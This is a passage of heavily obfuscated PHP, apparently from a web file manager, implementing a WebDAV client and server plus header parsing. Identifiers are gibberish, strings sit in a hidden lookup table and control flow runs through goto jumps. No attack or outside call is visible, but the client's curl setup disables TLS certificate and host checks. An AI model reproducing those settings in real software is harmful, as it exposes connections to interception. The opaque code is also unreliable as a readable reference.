$d»÷øô¢ëá[301]; } $E³›»¼æ[$d»÷øô¢ëá[1482]] = $F¤¥ùĞÀµ; $this->update(); } } goto A‡ÖàÀ åã; DŸ¹«Í‘”: class HttpDavClient { public function __construct($dÌøÑ­¶, $B¨‚¡Ä´½, $C³¿Ûï‡¹Œ) { $this->header = array(); $this->userName = $B¨‚¡Ä´½; $this->userPassowrd = $C³¿Ûï‡¹Œ; } protected function makePath($bÂè­—‹‹³) { return $bÂè­—‹‹³; } protected function setHeader($B“ß‘åéÈ, $AÄ ¼š…òÁ = false) { if ($AÄ ¼š…òÁ === !1) { $this->header[] = $B“ß‘åéÈ; } else { $this->header[] = $B“ß‘åéÈ . $_SERVER[”Ì÷ñ­î¸][882] . $AÄ ¼š…òÁ; } } public function move($Fší‡—¨ñ, $aç‡ß‰Â©ß, $A‹´ùËÑé = '') { $AÙ‚¡œî• =& $_SERVER[”Ì÷ñ­î¸]; $this->setHeader($AÙ‚¡œî•[1771], $this->makePath($aç‡ß‰Â©ß)); $this->setHeader($AÙ‚¡œî•[1772], $AÙ‚¡œî•[1773]); if ($A‹´ùËÑé) { $this->setHeader($AÙ‚¡œî•[1774], $AÙ‚¡œî•[927] . $A‹´ùËÑé . $AÙ‚¡œî•[930]); } return $this->send($AÙ‚¡œî•[1775], $Fší‡—¨ñ); } public function copy($Fç»æ‰Ş¸‘, $EÒĞØ“ã‰Ã) { $b¬ŞÏö•Œ =& $_SERVER[”Ì÷ñ­î¸]; $this->setHeader($b¬ŞÏö•Œ[1771], $this->makePath($EÒĞØ“ã‰Ã)); $this->setHeader($b¬ŞÏö•Œ[1772], $b¬ŞÏö•Œ[1773]); return $this->send($b¬ŞÏö•Œ[1776], $Fç»æ‰Ş¸‘); } public function mkcol($fß¤®¢ÃÁÏ) { $aõ»ë²¦“ =& $_SERVER[”Ì÷ñ­î¸]; $this->setHeader($aõ»ë²¦“[1772], $aõ»ë²¦“[1773]); return $this->send($aõ»ë²¦“[1777], $fß¤®¢ÃÁÏ); } public function delete($CíÎ¦öİÊÄ, $EáœŸŒÚ´» = '') { $B§·­¨÷Ì” =& $_SERVER[”Ì÷ñ­î¸]; if ($EáœŸŒÚ´») { $this->setHeader($B§·­¨÷Ì”[1774], $B§·­¨÷Ì”[927] . $EáœŸŒÚ´» . $B§·­¨÷Ì”[930]); } return $this->send($B§·­¨÷Ì”[1253], $CíÎ¦öİÊÄ); } public function propfind($B¤Î½ÕÇî) { $aäí¾¢ªİ­ =& $_SERVER[”Ì÷ñ­î¸]; $this->setHeader($aäí¾¢ªİ­[1778], $aäí¾¢ªİ­[83]); $this->setHeader($aäí¾¢ªİ­[1779], $aäí¾¢ªİ­[1780]); $fÔ‹«¶¸Œğ = $aäí¾¢ªİ­[1781]; return $this->send($aäí¾¢ªİ­[1782], $B¤Î½ÕÇî, $fÔ‹«¶¸Œğ); } public function options($B¡êä”¹Ï) { return $this->send($_SERVER[”Ì÷ñ­î¸][1783], $B¡êä”¹Ï); } public function get($f†Ó„ë‹ ) { return $this->send($_SERVER[”Ì÷ñ­î¸][216], $f†Ó„ë‹ ); } public function put($eê¸½Éçê, $aãœó¡Œ·½, $EÎÀ³†„¾î = '') { $eáøğÈÂ¼ñ =& $_SERVER[”Ì÷ñ­î¸]; if ($EÎÀ³†„¾î) { $this->setHeader($eáøğÈÂ¼ñ[1774], $eáøğÈÂ¼ñ[927] . $EÎÀ³†„¾î . $eáøğÈÂ¼ñ[930]); } return $this->send($eáøğÈÂ¼ñ[214], $eê¸½Éçê, $aãœó¡Œ·½); } protected function send($BÚ„ËÌò¹Ñ, $aÏÏá‰ê£, $b„ï©ÀÆñã = false, $e¾›ìŒà’ = false) { goto F³‚ÅŠ‘Òæ; aº„©¿: $bÊÛ“·µÉ = curl_init($aÏÏá‰ê£); curl_setopt($bÊÛ“·µÉ, CURLOPT_CUSTOMREQUEST, $BÚ„ËÌò¹Ñ); curl_setopt($bÊÛ“·µÉ, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto fŸË÷»öÈ; d¨‚‘¡Ç˜•: curl_setopt($bÊÛ“·µÉ, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($bÊÛ“·µÉ, CURLOPT_SSL_VERIFYHOST, !1); $EàÓÖæšÔÁ = curl_exec($bÊÛ“·µÉ); goto c†±ßß¤ËŠ; E­˜îåÅßö: $this->setHeader($cïÑÁÖÁÅ±); if ($b„ï©ÀÆñã) { $b„ï©ÀÆñã = $c­±‡«‡­[1785] . $b„ï©ÀÆñã; } if (!request_url_safe($aÏÏá‰ê£)) { return !1; } goto aº„©¿; F³‚ÅŠ‘Òæ: $c­±‡«‡­ =& $_SERVER[”Ì÷ñ­î¸]; $cïÑÁÖÁÅ± = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($c­±‡«‡­[1784], $c­±‡«‡­[50]); goto E­˜îåÅßö; c†±ßß¤ËŠ: $this->header = array(); return $EàÓÖæšÔÁ; goto b†ÊÈœÙÒ™; fŸË÷»öÈ: curl_setopt($bÊÛ“·µÉ, CURLOPT_HTTPHEADER, $this->header); curl_setopt($bÊÛ“·µÉ, CURLOPT_RETURNTRANSFER, !0); curl_setopt($bÊÛ“·µÉ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto d¨‚‘¡Ç˜•; b†ÊÈœÙÒ™: } } class HttpDavServer { public function __construct($F£Ø¹…Ñ·•, $Cª­©ã×ˆ°) { $this->root = $F£Ø¹…Ñ·•; $this->initPath($Cª­©ã×ˆ°); $this->start(); } public function initPath($CÒóã­Ó‰Ò) { $fŞ“¿‰±æ =& $_SERVER[”Ì÷ñ­î¸]; $a¥¦˜«âŞ± = rtrim($_SERVER[$fŞ“¿‰±æ[1390]], $fŞ“¿‰±æ[8]) . $fŞ“¿‰±æ[8]; $this->urlBase = substr($a¥¦˜«âŞ±, 0, strpos($a¥¦˜«âŞ±, $CÒóã­Ó‰Ò) + 1); $this->urlBase = rtrim($this->urlBase, $fŞ“¿‰±æ[8]) . $CÒóã­Ó‰Ò; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $cöÌíŸ¤“› =& $_SERVER[”Ì÷ñ­î¸]; $cÒ˜İÕĞ‹ = HttpAuth::get(); if ($cÒ˜İÕĞ‹[$cöÌíŸ¤“›[535]] == $cöÌíŸ¤“›[1786] && $cÒ˜İÕĞ‹[$cöÌíŸ¤“›[899]] == $cöÌíŸ¤“›[1787]) { return !0; } HttpAuth::error(); } public function start() { goto Eƒ ì£ŒóÏ; E†Ô÷î‰Î: if (!method_exists($this, $Dà¯Îï¼†)) { pr($Dà¯Îï¼† . $b‚îÃö«¢ç[1788]); die; } $e§±£ôãÅ = array($b‚îÃö«¢ç[1789], $b‚îÃö«¢ç[1790]); if (!in_array($Dà¯Îï¼†, $e§±£ôãÅ) && !$this->pathExists($this->path)) { $Dƒìø­å°± = array($b‚îÃö«¢ç[1032] => 404); } else { $Dƒìø­å°± = $this->{$Dà¯Îï¼†}(); } goto A°ƒŒøáº; A°ƒŒøáº: if (!$Dƒìø­å°±) { return; } self::response($Dƒìø­å°±); goto E‰˜ÊÁª‡; Eƒ ì£ŒóÏ: $b‚îÃö«¢ç =& $_SERVER[”Ì÷ñ­î¸]; $this->checkUser(); $Dà¯Îï¼† = $b‚îÃö«¢ç[144] . HttpHeader::method(); goto E†Ô÷î‰Î; E‰˜ÊÁª‡: } public function pathGet($B¢á¾‚”ƒõ = false) { $Dø³ì‚·¿Ø =& $_SERVER[”Ì÷ñ­î¸]; $a”Ó¦ªà‰ = $B¢á¾‚”ƒõ ? $_SERVER[$Dø³ì‚·¿Ø[1791]] : $_SERVER[$Dø³ì‚·¿Ø[1390]]; $a”Ó¦ªà‰ = KodIO::clear(rawurldecode($a”Ó¦ªà‰)); if (!strstr($a”Ó¦ªà‰, KodIO::clear($this->urlBase))) { return !1; } return substr($a”Ó¦ªà‰, strpos($a”Ó¦ªà‰, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($aãÄÏˆõ„‰) { return file_exists($aãÄÏˆõ„‰); } public function pathMkdir($C¡Ó˜á˜Ì¹) { return mkdir($C¡Ó˜á˜Ì¹, 511, !0); } public function pathInfo($BõÊëÖùÂ’) { return path_info($BõÊëÖùÂ’); } public function pathList($FÖƒ¯ˆÊ¸ì) { return path_list($FÖƒ¯ˆÊ¸ì); } public function pathOut($a„·†ÔÁ…î) { echo file_get_contents($a„·†ÔÁ…î); } public function pathPut($c¹ŒÒ¡ÄìÓ, $f¨Ú“¶â¨ê = '') { if (!$f¨Ú“¶â¨ê) { return file_put_contents($c¹ŒÒ¡ÄìÓ, $_SERVER[”Ì÷ñ­î¸][33]); } return move_path($f¨Ú“¶â¨ê, $c¹ŒÒ¡ÄìÓ); } public function pathRemove($F®›íÀ‘Ó) { if (is_file($F®›íÀ‘Ó)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($fµ˜…ÖŠÓ, $d‹ï×ˆ ¯£) { return move_path($fµ˜…ÖŠÓ, $d‹ï×ˆ ¯£); } public function pathCopy($AŸİ‰Š£ˆ², $A††—î„îÀ) { return copy_dir($AŸİ‰Š£ˆ², $A††—î„îÀ); } public function parsePath($FäÚÛ­´ñÈ) { return $FäÚÛ­´ñÈ; } public function parseItem($e„‹Ó•‚Ã‡, $EÊ…õÚ³à) { goto aòñß ˆö—; aòñß ˆö—: $aª‹ïƒ…ª¢ =& $_SERVER[”Ì÷ñ­î¸]; $bÆ—˜Ç±¹å = $this->pathGet() . $aª‹ïƒ…ª¢[8] . $e„‹Ó•‚Ã‡[$aª‹ïƒ…ª¢[28]]; $bÆ—˜Ç±¹å = $aª‹ïƒ…ª¢[8] . str_replace($aª‹ïƒ…ª¢[172], $aª‹ïƒ…ª¢[8], rawurlencode($bÆ—˜Ç±¹å)); goto bíĞØ­ÃîÃ; bíĞØ­ÃîÃ: if ($EÊ…õÚ³à) { $bÆ—˜Ç±¹å = $aª‹ïƒ…ª¢[8] . str_replace($aª‹ïƒ…ª¢[172], $aª‹ïƒ…ª¢[8], rawurlencode($this->pathGet())); } if (!trim($e„‹Ó•‚Ã‡[$aª‹ïƒ…ª¢[107]])) { $e„‹Ó•‚Ã‡[$aª‹ïƒ…ª¢[107]] = time(); } if (!trim($e„‹Ó•‚Ã‡[$aª‹ïƒ…ª¢[187]])) { $e„‹Ó•‚Ã‡[$aª‹ïƒ…ª¢[187]] = time(); } goto Eïº¯ñ–¡º; Eïº¯ñ–¡º: $cíäŠ‹¦“Œ = array($aª‹ïƒ…ª¢[1792] => KodIO::clear($this->urlBase . $bÆ—˜Ç±¹å), $aª‹ïƒ…ª¢[107] => @gmdate($aª‹ïƒ…ª¢[1793], $e„‹Ó•‚Ã‡[$aª‹ïƒ…ª¢[107]]), $aª‹ïƒ…ª¢[187] => @gmdate($aª‹ïƒ…ª¢[1794], $e„‹Ó•‚Ã‡[$aª‹ïƒ…ª¢[187]]), $aª‹ïƒ…ª¢[77] => $e„‹Ó•‚Ã‡[$aª‹ïƒ…ª¢[77]] ? $e„‹Ó•‚Ã‡[$aª‹ïƒ…ª¢[77]] : 0); return $cíäŠ‹¦“Œ; goto DôøÇö¿äÜ; DôøÇö¿äÜ: } public function parseItemXml($EßÈİÖÙ²², $CéÂ‚”ªè¬) { $AÅï¥ÂãŒ =& $_SERVER[”Ì÷ñ­î¸]; $eŠ§¥ºîâù = $this->parseItem($EßÈİÖÙ²², $CéÂ‚”ªè¬); if ($EßÈİÖÙ²²[$AÅï¥ÂãŒ[29]] == $AÅï¥ÂãŒ[76]) { $D•…ã¤ëÃê = $AÅï¥ÂãŒ[1795]; $D•…ã¤ëÃê .= $AÅï¥ÂãŒ[1796]; } else { $dãâ›œÆ‰ = $EßÈİÖÙ²²[$AÅï¥ÂãŒ[160]] ? $EßÈİÖÙ²²[$AÅï¥ÂãŒ[160]] : get_path_ext($EßÈİÖÙ²²[$AÅï¥ÂãŒ[28]]); $Fâ”çíëš = get_file_mime($dãâ›œÆ‰); $D•…ã¤ëÃê = $AÅï¥ÂãŒ[1797]; $D•…ã¤ëÃê .= "\74\104\x3a\147\x65\164\143\x6f\x6e\164\x65\x6e\164\164\171\160\x65\76{$Fâ”çíëš}\x3c\57\104\x3a\x67\x65\x74\143\157\x6e\164\145\x6e\164\x74\171\160\x65\76"; } return "\xa\11\11\74\104\x3a\162\145\163\160\157\x6e\163\145\x3e\xa\11\x9\11\x3c\104\72\150\x72\x65\146\76{$eŠ§¥ºîâù[$AÅï¥ÂãŒ[1792]]}\74\x2f\x44\x3a\x68\162\x65\146\x3e\xa\x9\x9\x9\x3c\x44\x3a\160\162\x6f\x70\x73\x74\x61\164\76\xa\x9\11\x9\11\x3c\x44\72\160\162\157\160\x3e\xa\x9\x9\x9\11\11\74\x44\x3a\147\145\x74\154\141\x73\x74\x6d\157\x64\x69\x66\x69\145\144\x3e{$eŠ§¥ºîâù[$AÅï¥ÂãŒ[107]]}\x3c\x2f\104\72\x67\x65\164\154\x61\163\x74\x6d\x6f\144\x69\146\x69\145\144\76\xa\11\x9\x9\11\11\74\x44\x3a\143\162\145\141\x74\151\x6f\x6e\144\141\x74\145\x3e{$eŠ§¥ºîâù[$AÅï¥ÂãŒ[187]]}\74\57\x44\x3a\x63\162\145\141\x74\x69\x6f\x6e\144\x61\164\x65\x3e\12\11\x9\11\11\11\74\104\72\x67\145\x74\x63\x6f\x6e\164\x65\x6e\x74\154\x65\156\x67\x74\150\x3e{$eŠ§¥ºîâù[$AÅï¥ÂãŒ[77]]}\74\57\x44\x3a\147\145\x74\143\157\x6e\164\145\x6e\x74\154\145\156\x67\x74\150\x3e\xa\11\11\x9\11\x9{$D•…ã¤ëÃê}\xa\x9\11\11\x9\74\x2f\104\72\x70\162\157\x70\76\xa\x9\x9\x9\x9\x3c\104\x3a\163\x74\x61\164\x75\163\76\110\124\124\120\57\61\56\61\x20\62\60\60\x20\117\113\x3c\x2f\104\x3a\x73\x74\141\x74\165\x73\x3e\12\11\11\x9\x3c\x2f\x44\x3a\x70\162\157\160\163\x74\x61\164\76\xa\11\x9\x3c\57\x44\x3a\x72\x65\x73\x70\x6f\x6e\163\x65\x3e"; } public function pathListMerge($CÊ¾Ò…‘Ğõ) { goto f˜òìô İ; a÷¼İ¬ª®ª: $DĞĞë¡…Ä = array(); foreach ($CÊ¾Ò…‘Ğõ as $C§‰ƒÄÜ×ç => $Cä‹êîµ·İ) { if (!in_array($C§‰ƒÄÜ×ç, $Cƒ³šùÛÑ†) || !is_array($Cä‹êîµ·İ)) { continue; } $DĞĞë¡…Ä = array_merge($DĞĞë¡…Ä, $Cä‹êîµ·İ); } foreach ($DĞĞë¡…Ä as &$DØÂó¥´) { $DØÂó¥´[$DâÕøºØº‘[28]] = str_replace($DâÕøºØº‘[8], $DâÕøºØº‘[1392], $DØÂó¥´[$DâÕøºØº‘[28]]); } goto f”ÉŒÑ®Æñ; f”ÉŒÑ®Æñ: return $DĞĞë¡…Ä; goto eï–¯Úºïˆ; f˜òìô İ: $DâÕøºØº‘ =& $_SERVER[”Ì÷ñ­î¸]; if (!$CÊ¾Ò…‘Ğõ) { return $CÊ¾Ò…‘Ğõ; } $Cƒ³šùÛÑ† = array($DâÕøºØº‘[73], $DâÕøºØº‘[74], $DâÕøºØº‘[1798]); goto a÷¼İ¬ª®ª; eï–¯Úºïˆ: } public function httpPROPFIND() { goto e¤±¸·»åë; aª®ÓÕÔ®: return array($cÑÕ¨å†Î¯[1801] => 207, $cÑÕ¨å†Î¯[1802] => "\x3c\x44\72\155\165\154\164\151\x73\164\141\x74\165\163\x20\x78\x6d\x6c\156\163\72\104\75\42\104\x41\x56\x3a\42\x3e\12{$e¿³ù¥é–Î}\xa\x3c\x2f\104\x3a\x6d\x75\x6c\x74\151\x73\x74\x61\x74\x75\163\76"); goto d–±ãÇö« ; e¤±¸·»åë: $cÑÕ¨å†Î¯ =& $_SERVER[”Ì÷ñ­î¸]; $BóªÖÛ„Îò = $this->pathList($this->path); $DöãÑ¶¼±› = $this->pathListMerge($BóªÖÛ„Îò); goto Aõ´˜ï×†è; FŠ¢ÅÜÎœƒ: if ($bçÑœ¹è´”) { $DöãÑ¶¼±› = array($d¦œĞ”Á‡); } else { $d¦œĞ”Á‡[$cÑÕ¨å†Î¯[28]] = $cÑÕ¨å†Î¯[33]; $DöãÑ¶¼±› = array_merge(array($d¦œĞ”Á‡), $DöãÑ¶¼±›); } $e¿³ù¥é–Î = $cÑÕ¨å†Î¯[33]; foreach ($DöãÑ¶¼±› as $c½ÄÉàŸöÒ) { $e¿³ù¥é–Î .= $this->parseItemXml($c½ÄÉàŸöÒ, $bçÑœ¹è´”); } goto aª®ÓÕÔ®; Aõ´˜ï×†è: $d¦œĞ”Á‡ = $BóªÖÛ„Îò[$cÑÕ¨å†Î¯[1799]]; if (!is_array($DöãÑ¶¼±›) || $d¦œĞ”Á‡[$cÑÕ¨å†Î¯[1800]] === !1) { return array($cÑÕ¨å†Î¯[1801] => 404, $cÑÕ¨å†Î¯[1802] => $cÑÕ¨å†Î¯[1803]); } $bçÑœ¹è´” = $d¦œĞ”Á‡[$cÑÕ¨å†Î¯[29]] == $cÑÕ¨å†Î¯[167] || HttpHeader::get($cÑÕ¨å†Î¯[1778]) == $cÑÕ¨å†Î¯[468]; goto FŠ¢ÅÜÎœƒ; d–±ãÇö« : } public function httpHEAD() { $Dà¨ù„Ñ† =& $_SERVER[”Ì÷ñ­î¸]; $eÎ¤ÏÂë‘æ = $this->pathInfo($this->path); if (!$eÎ¤ÏÂë‘æ || $eÎ¤ÏÂë‘æ[$Dà¨ù„Ñ†[29]] == $Dà¨ù„Ñ†[76]) { return array($Dà¨ù„Ñ†[1032] => 200, $Dà¨ù„Ñ†[1209] => array($Dà¨ù„Ñ†[1804])); } return array($Dà¨ù„Ñ†[1032] => 200, $Dà¨ù„Ñ†[1209] => array($Dà¨ù„Ñ†[1805], $Dà¨ù„Ñ†[136], $Dà¨ù„Ñ†[1806] . $eÎ¤ÏÂë‘æ[$Dà¨ù„Ñ†[77]], $Dà¨ù„Ñ†[1807] . get_file_mime($eÎ¤ÏÂë‘æ[$Dà¨ù„Ñ†[160]]), $Dà¨ù„Ñ†[132] . gmdate($Dà¨ù„Ñ†[1793], $eÎ¤ÏÂë‘æ[$Dà¨ù„Ñ†[1256]]) . $Dà¨ù„Ñ†[1808], $Dà¨ù„Ñ†[1809])); } public function httpOPTIONS() { $A¤ºƒ¿ôå =& $_SERVER[”Ì÷ñ­î¸]; return array($A¤ºƒ¿ôå[1032] => 200, $A¤ºƒ¿ôå[1209] => array($A¤ºƒ¿ôå[1810], $A¤ºƒ¿ôå[1811], $A¤ºƒ¿ôå[1812], $A¤ºƒ¿ôå[1265])); } public function httpPROPPATCH() { $c‹Š§ÊÏø =& $_SERVER[”Ì÷ñ­î¸]; $FİĞÒŒê½ = $c‹Š§ÊÏø[1813] . $_SERVER[$c‹Š§ÊÏø[1390]] . $c‹Š§ÊÏø[1814]; return array($c‹Š§ÊÏø[1801] => 207, $c‹Š§ÊÏø[1802] => "\x3c\104\72\155\165\154\x74\151\x73\164\141\164\x75\x73\40\170\x6d\154\156\x73\x3a\x44\x3d\42\104\x41\x56\72\x22\76\12{$FİĞÒŒê½}\12\74\57\x44\x3a\155\165\154\164\x69\163\164\141\x74\165\x73\x3e"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $c¿ìÈ™ã =& $_SERVER[”Ì÷ñ­î¸]; $c°ˆ„ö¬ïõ = $this->uploadFile(); if ($c°ˆ„ö¬ïõ) { $a´¼¡ãÇÏ† = 204; } else { $c°ˆ„ö¬ïõ = $c¿ìÈ™ã[33]; $a´¼¡ãÇÏ† = 201; } $e÷‘Ì‚ëÍù = $this->pathPut($this->path, $c°ˆ„ö¬ïõ); if ($e÷‘Ì‚ëÍù == !1) { $a´¼¡ãÇÏ† = 404; } return array($c¿ìÈ™ã[1801] => $a´¼¡ãÇÏ†); } private function uploadFile() { goto dƒÅÓÂå²‰; FÉÄÑÄ¤µ: while (!feof($d¡ô»ä•©š)) { fwrite($FìŞÓ’‚ØÊ, fread($d¡ô»ä•©š, 1024 * 200)); } fclose($d¡ô»ä•©š); fclose($FìŞÓ’‚ØÊ); goto aäğø‹Õ™è; cõùÃ…ÊœÛ: $FìŞÓ’‚ØÊ = @fopen($fğÑÃ×˜¿, $C²äŒ‹Êó§[1524]); $d¡ô»ä•©š = @fopen($C²äŒ‹Êó§[1816], $C²äŒ‹Êó§[1523]); if (!$d¡ô»ä•©š || !$FìŞÓ’‚ØÊ) { @unlink($fğÑÃ×˜¿); return !1; } goto FÉÄÑÄ¤µ; dƒÅÓÂå²‰: $C²äŒ‹Êó§ =& $_SERVER[”Ì÷ñ­î¸]; @mk_dir(TEMP_FILES); $fğÑÃ×˜¿ = TEMP_FILES . $C²äŒ‹Êó§[1815] . rand_string(32); goto cõùÃ…ÊœÛ; aäğø‹Õ™è: if (@filesize($fğÑÃ×˜¿) > 0) { return $fğÑÃ×˜¿; } @unlink($fğÑÃ×˜¿); return !1; goto FØà†õÚ„¡; FØà†õÚ„¡: } public function httpMKCOL() { $D²¼Àøªª =& $_SERVER[”Ì÷ñ­î¸]; if ($this->pathExists($this->path)) { return array($D²¼Àøªª[1032] => 409); } $AĞš­Æª© = $this->pathMkdir($this->path); return array($D²¼Àøªª[1032] => $AĞš­Æª© ? 201 : 403); } public function httpMOVE() { $dòçÖ„«Ü =& $_SERVER[”Ì÷ñ­î¸]; $Fô¿ƒ­¬¬– = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$dòçÖ„«Ü[1817]])) { $B—ÒÜ±‰õå[$dòçÖ„«Ü[1818]] = $_SERVER[$dòçÖ„«Ü[1817]] == $dòçÖ„«Ü[1819]; } $A´œ· ¶Â¹ = $this->pathMove($this->path, $Fô¿ƒ­¬¬–); return array($dòçÖ„«Ü[1032] => $A´œ· ¶Â¹ ? 201 : 404); } public function httpCOPY() { $D¼¶ŠâöÏ = $this->parsePath($this->pathGet(!0)); $CèÛí¢åßÎ = $this->pathCopy($this->path, $D¼¶ŠâöÏ); return array($_SERVER[”Ì÷ñ­î¸][1032] => $CèÛí¢åßÎ ? 201 : 404); } public function httpDELETE() { $eÎ‘…²“·‘ = $this->pathRemove($this->path); return array($_SERVER[”Ì÷ñ­î¸][1032] => $eÎ‘…²“·‘ ? 200 : 503); } public function httpLOCK() { $cÏ¯×Í°•§ =& $_SERVER[”Ì÷ñ­î¸]; $cğù·Æ¬¯õ = md5($this->path); $dÁ¶ƒ“ôá = $cÏ¯×Í°•§[1820] . $this->xmlGet($cÏ¯×Í°•§[1821]) . $cÏ¯×Í°•§[1822] . $cğù·Æ¬¯õ . $cÏ¯×Í°•§[1823]; return array($cÏ¯×Í°•§[1032] => 200, $cÏ¯×Í°•§[1209] => array($cÏ¯×Í°•§[1824] . $cğù·Æ¬¯õ, $cÏ¯×Í°•§[1825]), $cÏ¯×Í°•§[1826] => $dÁ¶ƒ“ôá); } public function httpUNLOCK() { return array($_SERVER[”Ì÷ñ­î¸][1032] => 204); } public function xmlGet($d„¥–öˆæó) { goto bó’Ş‹˜ø; eóŒ¨ùŠ×Ä: $eğÑá‘ò® = array_shift(explode($b¨ëÍŞ—¬Ú[8], $d„¥–öˆæó)); $A‘÷åéó•ˆ = $Dß—±£Ã->getElementsByTagNameNS($b¨ëÍŞ—¬Ú[1828], $eğÑá‘ò®); if ($A‘÷åéó•ˆ) { return $A‘÷åéó•ˆ[0]->nodeValue; } goto cØã…Å‡ôø; bó’Ş‹˜ø: $b¨ëÍŞ—¬Ú =& $_SERVER[”Ì÷ñ­î¸]; static $Dß—±£Ã = false; if (!$Dß—±£Ã) { $BÇäÎÊ¿é = file_get_contents($b¨ëÍŞ—¬Ú[1827]); $Dß—±£Ã = new DOMDocument(); $Dß—±£Ã->loadXML($BÇäÎÊ¿é); } goto eóŒ¨ùŠ×Ä; cØã…Å‡ôø: return $b¨ëÍŞ—¬Ú[33]; goto F„™ë³¨Ë´; F„™ë³¨Ë´: } public static function response($AæÊá³ÙÆ) { goto bÂßæ†óø†; DØğ÷é‰†: $F–Öœ¬èñ÷[] = $câÚ‹á›ºø[1768]; $F–Öœ¬èñ÷[] = $câÚ‹á›ºø[1769]; foreach ($F–Öœ¬èñ÷ as $AÃ”é®ÃÇÏ) { header($AÃ”é®ÃÇÏ); } goto DáÆ¬áĞ¸ù; DáÆ¬áĞ¸ù: if (is_string($AæÊá³ÙÆ[$câÚ‹á›ºø[1826]])) { header($câÚ‹á›ºø[1829]); $d¦Ìğ½¯• = $câÚ‹á›ºø[1830] . $câÚ‹á›ºø[217] . $AæÊá³ÙÆ[$câÚ‹á›ºø[1826]]; echo $d¦Ìğ½¯•; } goto dè¿ÏÈÁ‰; bÂßæ†óø†: $câÚ‹á›ºø =& $_SERVER[”Ì÷ñ­î¸]; $F–Öœ¬èñ÷ = is_array($AæÊá³ÙÆ[$câÚ‹á›ºø[1209]]) ? $AæÊá³ÙÆ[$câÚ‹á›ºø[1209]] : array(); $F–Öœ¬èñ÷[] = HttpHeader::code($AæÊá³ÙÆ[$câÚ‹á›ºø[1032]]); goto DØğ÷é‰†; dè¿ÏÈÁ‰: } } class HttpHeader { public static $_headers = array("\x48\157\163\164" => "\x48\x54\x54\x50\137\x48\117\x53\x54", "\125\163\x65\x72\x2d\101\147\145\156\164" => "\110\124\124\x50\x5f\x55\123\x45\x52\x5f\101\x47\105\x4e\124", "\103\x6f\x6e\164\x65\x6e\x74\x2d\x54\171\x70\x65" => "\110\124\x54\120\137\x43\x4f\116\124\105\116\124\137\x54\x59\x50\105", "\103\x6f\x6e\164\x65\156\164\x2d\x4c\x65\156\x67\164\x68" => "\x48\x54\124\x50\137\103\x4f\x4e\124\105\116\x54\x5f\x4c\105\x4e\x47\x54\110", "\x44\145\160\164\150" => "\x48\124\124\120\x5f\x44\x45\120\x54\110", "\105\x78\x70\145\x63\x74" => "\110\124\124\x50\137\105\130\x50\105\x43\124", "\111\x66\x2d\x4e\157\x6e\x65\55\115\x61\164\143\150" => "\x48\124\x54\x50\137\x49\x46\137\x4e\x4f\116\x45\137\x4d\x41\124\103\110", "\x49\x66\55\115\x61\x74\143\150" => "\x48\x54\x54\x50\x5f\x49\106\137\115\101\x54\103\110", "\x49\146\x2d\x52\x61\156\147\x65" => "\110\124\x54\120\137\111\106\137\x52\101\116\107\x45", "\114\141\163\x74\55\115\157\x64\151\x66\151\x65\x64" => "\110\124\x54\120\137\x4c\101\x53\124\x5f\x4d\x4f\x44\111\106\x49\x45\x44", "\x49\x66\x2d\x4d\x6f\144\x69\146\151\145\x64\55\123\x69\156\143\x65" => "\x48\124\x54\x50\x5f\111\106\x5f\115\117\104\x49\106\111\x45\x44\137\x53\x49\116\x43\x45", "\x49\x66\55\125\156\x6d\157\144\151\146\151\145\144\55\x53\151\156\x63\x65" => "\110\x54\x54\120\x5f\x49\106\137\x55\x4e\115\x4f\104\x49\x46\x49\x45\x44\137\x53\x49\x4e\103\105", "\x52\141\x6e\147\145" => "\110\x54\124\x50\137\x52\x41\x4e\x47\x45", "\x54\151\x6d\145\x6f\165\x74" => "\110\x54\124\x50\x5f\x54\x49\x4d\105\x4f\125\124", "\111\146" => "\110\x54\x54\120\137\x49\x46", "\114\157\x63\x6b\x2d\124\157\x6b\145\156" => "\110\x54\x54\120\x5f\x4c\x4f\103\113\x5f\x54\x4f\x4b\105\x4e", "\117\x76\145\162\x77\162\151\x74\x65" => "\x48\x54\x54\x50\x5f\x4f\x56\105\x52\127\122\111\x54\x45", "\104\x65\x73\164\x69\x6e\x61\x74\x69\x6f\x6e" => "\110\x54\x54\x50\137\104\105\x53\124\111\x4e\x41\124\111\x4f\116", "\122\145\161\165\x65\x73\164\55\x49\x64" => "\122\x45\121\125\105\x53\x54\x5f\x49\x44", "\122\145\x71\x75\145\163\164\55\x42\157\x64\x79\x2d\x46\x69\154\145" => "\x52\x45\121\125\105\x53\x54\x5f\x42\x4f\x44\x59\137\106\x49\114\105", "\122\x65\144\x69\162\x65\143\164\x2d\123\x74\x61\x74\165\163" => "\122\105\x44\x49\x52\105\x43\124\x5f\123\x54\101\124\x55\123"); public static function init() { static $BñöĞ£«¢‹ = false; if ($BñöĞ£«¢‹) { return; } foreach ($_SERVER as $CºùÏµ§‰ => $d’ˆÛØ¢ í) { $CºùÏµ§‰ = strtoupper($CºùÏµ§‰); if (!array_key_exists($CºùÏµ§‰, $_SERVER)) { continue; } $_SERVER[$CºùÏµ§‰] = $d’ˆÛØ¢ í; } foreach (self::$_headers as $CºùÏµ§‰ => $aÜ‹¬›Ì¸¼) { if (!array_key_exists($CºùÏµ§‰, $_SERVER)) { continue; } $_SERVER[$CºùÏµ§‰] = $_SERVER[$aÜ‹¬›Ì¸¼]; $_SERVER[strtoupper($CºùÏµ§‰)] = $_SERVER[$aÜ‹¬›Ì¸¼]; } } public static function get($fãñ‡¸©‹ª) { self::init(); return $_SERVER[$fãñ‡¸©‹ª] ? $_SERVER[$fãñ‡¸©‹ª] : $_SERVER[$_SERVER[”Ì÷ñ­î¸][1831] . strtoupper($fãñ‡¸©‹ª)]; } public static function method() { return strtoupper(self::get($_SERVER[”Ì÷ñ­î¸][154])); } public static function length() { $Fğ‡‚æ…ª¹ =& $_SERVER[”Ì÷ñ­î¸]; $fˆøÎäÄßå = self::get($Fğ‡‚æ…ª¹[1832]); if (!$fˆøÎäÄßå) { $fˆøÎäÄßå = self::get($Fğ‡‚æ…ª¹[1145]); } return $fˆøÎäÄßå; } public static function range() { $DÈ¦ï½©„ =& $_SERVER[”Ì÷ñ­î¸]; 